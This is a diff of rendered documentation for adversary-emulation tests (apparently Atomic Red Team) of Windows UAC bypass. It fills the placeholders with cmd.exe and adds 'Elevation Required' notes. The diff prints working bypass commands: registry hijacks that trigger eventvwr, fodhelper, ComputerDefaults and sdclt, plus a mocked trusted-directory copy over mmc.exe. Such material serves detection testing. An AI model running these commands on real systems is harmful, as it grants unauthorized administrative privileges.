@@ -820,7 +820,7 @@ Upon execution command prompt should be launched with administrative privelages<
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d &quot;#{executable_binary}&quot; /f
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d &quot;C:\Windows\System32\cmd.exe&quot; /f
 cmd.exe /c eventvwr.msc
 </pre></div>
 </div>
@@ -841,7 +841,7 @@ Upon execution command prompt should be launched with administrative privelages<
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="s2">&quot;HKCU:\software\classes\mscfile\shell\open\command&quot;</span> <span class="n">-Force</span>
-<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\mscfile\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;#{executable_binary}&quot;</span> <span class="n">-Force</span>
+<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\mscfile\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="n">-Force</span>
 <span class="nb">Start-Process</span> <span class="s2">&quot;C:\Windows\System32\eventvwr.msc&quot;</span>
 </pre></div>
 </div>
@@ -861,7 +861,7 @@ Upon execution, “The operation completed successfully.” will be shown twice 
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d &quot;#{executable_binary}&quot; /f
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d &quot;C:\Windows\System32\cmd.exe&quot; /f
 reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v &quot;DelegateExecute&quot; /f
 fodhelper.exe
 </pre></div>
@@ -884,7 +884,7 @@ Upon execution command prompt will be opened.</p>
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Force</span>
 <span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DelegateExecute&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;&quot;</span> <span class="n">-Force</span>
-<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;#{executable_binary}&quot;</span> <span class="n">-Force</span>
+<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="n">-Force</span>
 <span class="nb">Start-Process</span> <span class="s2">&quot;C:\Windows\System32\fodhelper.exe&quot;</span>
 </pre></div>
 </div>
@@ -901,12 +901,13 @@ Upon execution command prompt will be opened.</p>
 <h3>Atomic Test #5 - Bypass UAC using ComputerDefaults (PowerShell)<a class="headerlink" href="#atomic-test-5-bypass-uac-using-computerdefaults-powershell" title="Permalink to this headline">¶</a></h3>
 <p>PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
 Upon execution administrative command prompt should open</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id3">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Force</span>
 <span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DelegateExecute&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;&quot;</span> <span class="n">-Force</span>
-<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;#{executable_binary}&quot;</span> <span class="n">-Force</span>
+<span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKCU:\software\classes\ms-settings\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;(default)&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="n">-Force</span>
 <span class="nb">Start-Process</span> <span class="s2">&quot;C:\Windows\System32\ComputerDefaults.exe&quot;</span>
 </pre></div>
 </div>
@@ -923,11 +924,12 @@ Upon execution administrative command prompt should open</p>
 <h3>Atomic Test #6 - Bypass UAC by Mocking Trusted Directories<a class="headerlink" href="#atomic-test-6-bypass-uac-by-mocking-trusted-directories" title="Permalink to this headline">¶</a></h3>
 <p>Creates a fake “trusted directory” and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
 Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id4">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>mkdir &quot;\\?\C:\Windows \System32\&quot;
-copy &quot;#{executable_binary}&quot; &quot;\\?\C:\Windows \System32\mmc.exe&quot;
+copy &quot;C:\Windows\System32\cmd.exe&quot; &quot;\\?\C:\Windows \System32\mmc.exe&quot;
 mklink c:\testbypass.exe &quot;\\?\C:\Windows \System32\mmc.exe&quot;
 </pre></div>
 </div>
@@ -949,7 +951,7 @@ Adapted from <a class="reference external" href="https://github.com/mitre-attack
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id5">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Force</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Classes\Folder\shell\open\command&quot;</span> <span class="n">-Value</span> <span class="s1">&#39;#{command.to.execute}&#39;</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Force</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Classes\Folder\shell\open\command&quot;</span> <span class="n">-Value</span> <span class="s1">&#39;cmd.exe /c notepad.exe&#39;</span>
 <span class="nb">New-ItemProperty</span> <span class="n">-Force</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Classes\Folder\shell\open\command&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DelegateExecute&quot;</span>
 <span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="nv">$env:windir</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">sdclt</span><span class="p">.</span><span class="n">exe</span>
 <span class="nb">Start-Sleep</span> <span class="n">-s</span> <span class="n">3</span>
